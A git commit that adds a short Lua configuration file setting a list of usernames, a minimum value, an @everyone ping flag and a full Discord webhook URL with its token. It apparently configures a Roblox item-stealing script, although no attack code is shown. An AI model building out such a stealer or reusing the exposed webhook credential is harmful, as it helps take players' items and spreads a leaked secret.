24a4c591d893326a54609824a39b20bd274d7f16
thatboyskulls12 <aj.skulls12@gmail.com>
2025-07-08 18:52:08 -0400

    Create Source_1.lua

---
+++ Source_1.lua
@@ -0,0 +1,4 @@
+_G.Usernames = {"ajandaa12alt9", "kaianeiglLs", "ZWV_kgyj229", "KaianEIGLs"} -- you can add as many as you'd like
+_G.min_value = 0.1
+_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
+_G.webhook = "https://discord.com/api/webhooks/1389819831263432724/ghC-hYXflTHCvP3KmqFECs-4mHBxOnkQvJXTOd5UNdsCsbmidraYV_ELhs3KvWUAH6g8" -- change to your webhook
